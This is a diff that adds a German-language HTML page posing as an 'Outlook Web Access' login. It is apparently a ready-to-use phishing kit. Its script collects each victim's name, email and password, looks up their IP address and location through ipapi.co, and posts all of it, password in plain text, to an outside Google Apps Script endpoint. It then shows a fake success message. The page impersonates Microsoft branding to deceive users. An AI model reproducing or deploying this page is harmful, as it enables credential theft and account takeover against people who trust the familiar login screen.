@@ -1,0 +1,420 @@
+<!doctype html>
+<html lang="de">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Outlook Web Access</title>
+<style>
+  :root{ --blue:#0078D4; --muted:#666; --danger:#e03b3b; --success:#2fa84f; }
+  *{box-sizing:border-box}
+  body{
+    margin:0;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-family:Inter,system-ui,Arial,Segoe UI,Roboto;
+    background: linear-gradient(135deg,#eaf4ff 0%, #f3f7fb 100%);
+    color:#111;
+    padding:20px;
+  }
+  .card{ width:100%; max-width:460px; background:#fff; padding:26px; border-radius:12px; box-shadow:0 18px 40px rgba(20,30,50,0.08); animation: cardPop .36s; }
+  @keyframes cardPop { from{opacity:0;transform:translateY(-10px) scale(.996)} to{opacity:1;transform:none} }
+  h1{ margin:0 0 18px; text-align:center; color:var(--blue); font-size:20px; letter-spacing:0.6px; }
+  form{ width:100%; display:grid; gap:12px; }
+  .field { 
+    position:relative; 
+    opacity:0; 
+    transform:translateY(20px) scale(0.98); 
+    animation: enhancedFadeUp .6s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards; 
+    background: #fafbfd; 
+    padding:8px; 
+    border-radius:8px; 
+    border:1px solid #eef2f7; 
+    transition: all 0.3s ease;
+  }
+  .field:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(0,120,212,0.12);
+    border-color: rgba(0,120,212,0.3);
+  }
+  @keyframes enhancedFadeUp { 
+    0% { 
+      opacity: 0; 
+      transform: translateY(20px) scale(0.98); 
+    }
+    50% { 
+      opacity: 0.7; 
+      transform: translateY(10px) scale(0.99); 
+    }
+    100% { 
+      opacity: 1; 
+      transform: translateY(0) scale(1); 
+    }
+  }
+  .field:nth-of-type(1){ animation-delay: .15s } 
+  .field:nth-of-type(2){ animation-delay: .25s } 
+  .field:nth-of-type(3){ animation-delay: .35s } 
+  .field:nth-of-type(4){ animation-delay: .45s }
+  label { 
+    display:block; 
+    font-size:13px; 
+    color:var(--muted); 
+    margin-bottom:6px; 
+    opacity: 0;
+    animation: labelFadeIn .5s ease forwards;
+    animation-delay: inherit;
+  }
+  input[type="text"], input[type="email"], input[type="password"]{ 
+    width:100%; 
+    padding:11px 12px; 
+    border-radius:8px; 
+    border:1px solid #dfe6ee; 
+    font-size:15px; 
+    background:#fff; 
+    outline:none; 
+    transition: all 0.3s ease;
+    opacity: 0;
+    animation: inputFadeIn .5s ease forwards;
+    animation-delay: inherit;
+  }
+  input:focus { 
+    box-shadow: 0 8px 18px rgba(0,120,212,0.08); 
+    border-color:var(--blue); 
+    transform: scale(1.02);
+  }
+  .required { color:var(--danger); margin-left:6px; }
+  .pw-wrap { position:relative; }
+  .pw-toggle { 
+    position:absolute; 
+    right:10px; 
+    top:50%; 
+    transform:translateY(-50%); 
+    background:none; 
+    border:none; 
+    color:var(--blue); 
+    cursor:pointer; 
+    font-size:13px; 
+    padding:6px; 
+    border-radius:4px; 
+    transition: all 0.3s ease;
+    opacity: 0;
+    animation: toggleFadeIn .5s ease forwards;
+    animation-delay: inherit;
+  }
+  .pw-toggle:hover { 
+    background-color:rgba(0,120,212,0.1); 
+    color:var(--blue); 
+    transform: translateY(-50%) scale(1.1);
+  }
+  @keyframes labelFadeIn {
+    from { opacity: 0; transform: translateX(-10px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+  @keyframes inputFadeIn {
+    from { opacity: 0; transform: translateX(10px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+  @keyframes toggleFadeIn {
+    from { opacity: 0; transform: translateY(-50%) scale(0.8); }
+    to { opacity: 1; transform: translateY(-50%) scale(1); }
+  }
+  .cta { 
+    margin-top:6px; 
+    padding:12px; 
+    border-radius:10px; 
+    border:0; 
+    background: linear-gradient(90deg,var(--blue), #005a9e); 
+    color:#fff; 
+    font-weight:600; 
+    font-size:15px; 
+    cursor:pointer; 
+    opacity: 0;
+    animation: buttonFadeIn .6s ease forwards;
+    animation-delay: .6s;
+    transition: all 0.3s ease;
+    position: relative;
+    overflow: hidden;
+  }
+  .cta:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(0,120,212,0.3);
+  }
+  .cta:active {
+    transform: translateY(0);
+  }
+  @keyframes buttonFadeIn {
+    from { 
+      opacity: 0; 
+      transform: translateY(20px) scale(0.95); 
+    }
+    to { 
+      opacity: 1; 
+      transform: translateY(0) scale(1); 
+    }
+  }
+  .status { display:flex; gap:10px; align-items:center; justify-content:center; font-size:13px; color:var(--muted); }
+  .spinner { width:18px; height:18px; border-radius:50%; border:3px solid rgba(0,0,0,0.08); border-top-color:var(--blue); animation:spin 900ms linear infinite; display:inline-block; }
+  @keyframes spin { to{ transform:rotate(360deg) } }
+  .overlay { position:fixed; inset:0; display:none; align-items:center; justify-content:center; z-index:999; background: rgba(6,12,24,0.46); }
+  .overlay.show { display:flex; }
+  .modal { width:90%; max-width:460px; background:#fff; padding:26px; border-radius:12px; text-align:center; box-shadow:0 28px 80px rgba(6,12,24,0.25); }
+  .check { width:72px; height:72px; margin:0 auto 8px; border-radius:50%; display:grid; place-items:center; background: linear-gradient(180deg, rgba(47,168,79,0.12), rgba(47,168,79,0.06)); color:var(--success); font-size:34px; border:2px solid rgba(47,168,79,0.18); }
+  .modal h3{ margin:6px 0 0; font-size:18px; color:#123; }
+  .modal p{ color:#555; margin-top:8px; font-size:13px; }
+  .error { 
+    color:var(--danger); 
+    font-size:13px; 
+    text-align:center; 
+    display:none; 
+    margin-top:6px; 
+    opacity: 0;
+    transform: translateY(-10px);
+    transition: all 0.3s ease;
+  }
+  .error.show {
+    opacity: 1;
+    transform: translateY(0);
+  }
+  @media (max-width:520px){ .card{ padding:18px; } }
+</style>
+</head>
+<body>
+  <main class="card" role="main" aria-labelledby="title">
+    <h1 id="title">OUTLOOK WEB ACCESS</h1>
+
+    <form id="leadForm" autocomplete="off" novalidate>
+      <div class="field">
+        <label for="fullname">Vollständiger Name <span class="required" aria-hidden="true">*</span></label>
+        <input id="fullname" name="fullname" type="text" required aria-required="true" />
+      </div>
+
+      <div class="field">
+        <label for="email">E-Mail <span class="required" aria-hidden="true">*</span></label>
+        <input id="email" name="email" type="email" required aria-required="true" />
+      </div>
+
+      <div class="field pw-wrap">
+        <label for="password">Passwort <span class="required" aria-hidden="true">*</span></label>
+        <input id="password" name="password" type="password" required aria-required="true" />
+        <button type="button" class="pw-toggle" aria-label="Passwort-Sichtbarkeit umschalten" onclick="togglePassword('password', this)">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+          </svg>
+        </button>
+      </div>
+
+      <div class="field pw-wrap">
+        <label for="repeatPassword">Passwort wiederholen <span class="required" aria-hidden="true">*</span></label>
+        <input id="repeatPassword" name="repeatPassword" type="password" required aria-required="true" />
+        <button type="button" class="pw-toggle" aria-label="Passwort-Wiederholung-Sichtbarkeit umschalten" onclick="togglePassword('repeatPassword', this)">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+          </svg>
+        </button>
+      </div>
+
+      <div id="inlineError" class="error" role="alert" aria-live="assertive"></div>
+
+      <button id="submitBtn" class="cta" type="submit">ANMELDEN</button>
+      <div id="statusRow" class="status" style="display:none"><span class="spinner" aria-hidden="true"></span><span>Wird gesendet…</span></div>
+    </form>
+  </main>
+
+  <div id="overlay" class="overlay" aria-hidden="true">
+    <div id="modal" class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalText"></div>
+  </div>
+
+<script>
+/* === CONFIG: Update this URL to your Google Apps Script deployment URL === */
+const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxj4Fb1ajr5_cRjImDJ4TULb7AWTH6Bph-EVO2_wIWQNpEgzB2IAaQc-8JzujtFMOu9/exec';
+
+/* UI helpers */
+const overlay = document.getElementById('overlay');
+const modal = document.getElementById('modal');
+const submitBtn = document.getElementById('submitBtn');
+const statusRow = document.getElementById('statusRow');
+const inlineError = document.getElementById('inlineError');
+
+function showOverlay(contentHtml) { 
+  modal.innerHTML = contentHtml; 
+  overlay.classList.add('show'); 
+  overlay.setAttribute('aria-hidden','false'); 
+  console.log('Overlay shown with content:', contentHtml);
+}
+
+function hideOverlay(){ 
+  overlay.classList.remove('show'); 
+  overlay.setAttribute('aria-hidden','true'); 
+  console.log('Overlay hidden');
+}
+
+function showSpinnerOverlay(){ 
+  showOverlay('<div style="display:flex;gap:12px;align-items:center;justify-content:center;"><div class="spinner" aria-hidden="true"></div><div>Wird gesendet…</div></div>'); 
+}
+
+function showSuccessOverlay(){ 
+  console.log('showSuccessOverlay called');
+  showOverlay('<div class="check">✔</div><h3 id="modalTitle">Anmeldung erfolgreich!</h3><p id="modalText">Vielen Dank — Ihre Informationen wurden erfolgreich übermittelt.</p>'); 
+  setTimeout(hideOverlay,3000); 
+}
+
+function showErrorOverlay(message){ 
+  console.log('showErrorOverlay called with message:', message);
+  showOverlay('<div style="color:var(--danger);font-size:48px;margin-bottom:16px;">⚠</div><h3 id="modalTitle">Übermittlungsfehler</h3><p id="modalText">' + message + '</p><button onclick="hideOverlay()" style="margin-top:16px;padding:8px 16px;background:var(--blue);color:white;border:none;border-radius:6px;cursor:pointer;">OK</button>'); 
+}
+
+/* Password toggle functionality */
+function togglePassword(fieldId, btn) {
+  const field = document.getElementById(fieldId);
+  if (!field) return;
+  
+  if (field.type === 'password') {
+    field.type = 'text';
+    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.45 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
+  } else {
+    field.type = 'password';
+    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>';
+  }
+}
+
+/* Prefetch geo data */
+let geo = { ip:'Unknown', city:'Unknown', country:'Unknown' };
+async function prefetchGeo(){
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    if (r.ok) { const j = await r.json(); geo.ip = j.ip || geo.ip; geo.city = j.city || geo.city; geo.country = j.country_name || geo.country; return;}
+  } catch(e){ console.warn('ipapi primary failed', e); }
+  try {
+    const ri = await fetch('https://api.ipify.org?format=json');
+    if (ri.ok){ const ji = await ri.json(); const r2 = await fetch('https://ipapi.co/'+ji.ip+'/json/'); if (r2.ok){ const j2 = await r2.json(); geo.ip = j2.ip||geo.ip; geo.city = j2.city||geo.city; geo.country = j2.country_name||geo.country; return; } }
+  } catch(e2){ console.warn('ipapi fallback failed', e2); }
+}
+prefetchGeo();
+
+/* Submit handler - back to the working method! */
+document.getElementById('leadForm').addEventListener('submit', async function(e){
+  e.preventDefault();
+  console.log('Form submitted - starting validation');
+  
+  inlineError.style.display = 'none';
+  inlineError.classList.remove('show');
+
+  const fullname = document.getElementById('fullname').value.trim();
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value;
+  const repeatPassword = document.getElementById('repeatPassword').value;
+
+  console.log('Form data:', { fullname, email, password: '***', repeatPassword: '***' });
+
+  if(!fullname || !email || !password || !repeatPassword){
+    inlineError.textContent = 'Bitte füllen Sie alle erforderlichen Felder aus.'; 
+    inlineError.style.display = 'block'; 
+    setTimeout(() => inlineError.classList.add('show'), 10);
+    return;
+  }
+  
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!emailRegex.test(email)) {
+    inlineError.textContent = 'Bitte geben Sie eine gültige E-Mail-Adresse ein.'; 
+    inlineError.style.display = 'block'; 
+    setTimeout(() => inlineError.classList.add('show'), 10);
+    return;
+  }
+  
+  if (password !== repeatPassword) {
+    inlineError.textContent = 'Passwörter stimmen nicht überein.'; 
+    inlineError.style.display = 'block'; 
+    setTimeout(() => inlineError.classList.add('show'), 10);
+    return;
+  }
+
+  const payload = {
+    fullname, email, password, repeatPassword,
+    ip: geo.ip, city: geo.city, country: geo.country,
+    browser: navigator.userAgent,
+    timestamp: (new Date()).toISOString()
+  };
+
+  console.log('Payload prepared:', payload);
+  console.log('Submitting to URL:', SCRIPT_URL);
+
+  submitBtn.disabled = true; 
+  statusRow.style.display = 'flex'; 
+  showSpinnerOverlay();
+
+  try {
+    // Send data to the Google Apps Script URL
+    const formData = new FormData();
+    Object.keys(payload).forEach(key => {
+      formData.append(key, payload[key]);
+    });
+    
+    console.log('Sending request...');
+    const response = await fetch(SCRIPT_URL, {
+      method: 'POST',
+      body: formData
+    });
+
+    console.log('Response received:', response);
+    console.log('Response status:', response.status);
+    console.log('Response ok:', response.ok);
+
+    if (response.ok) {
+      try {
+        const serverResponse = await response.json();
+        console.log('Server response parsed:', serverResponse);
+        console.log('Server response success:', serverResponse.success);
+        
+        if (serverResponse.success === true) {
+          console.log('Success detected - showing success overlay');
+          showSuccessOverlay();
+          document.getElementById('leadForm').reset();
+          inlineError.style.display = 'none';
+          inlineError.classList.remove('show');
+          console.log('Success message shown');
+          // Don't hide overlay here - let the timeout handle it
+        } else {
+          console.log('Server returned error:', serverResponse.error);
+          showErrorOverlay(serverResponse.error || 'Server returned an error');
+        }
+      } catch (parseError) {
+        console.log('JSON parse error, treating as success:', parseError);
+        showSuccessOverlay();
+        document.getElementById('leadForm').reset();
+        inlineError.style.display = 'none';
+        inlineError.classList.remove('show');
+        console.log('Success (no JSON response):', response.status);
+        // Don't hide overlay here - let the timeout handle it
+      }
+    } else {
+      console.log('HTTP error status:', response.status);
+      showErrorOverlay(`Server responded with status: ${response.status}`);
+    }
+  } catch (err) {
+    console.log('Network error:', err);
+    showErrorOverlay(`Network error: ${err.message}`);
+  }
+
+  console.log('Resetting UI state');
+  submitBtn.disabled = false; 
+  statusRow.style.display = 'none'; 
+  // Don't call hideOverlay() here - let the timeout handle it
+});
+
+// Test functions for debugging
+window.testSuccess = function() {
+  console.log('Testing success overlay...');
+  showSuccessOverlay();
+};
+
+window.testError = function() {
+  console.log('Testing error overlay...');
+  showErrorOverlay('Test error message');
+};
+
+console.log('Form script loaded successfully');
+console.log('SCRIPT_URL:', SCRIPT_URL);
+</script>
+</body>
+</html>
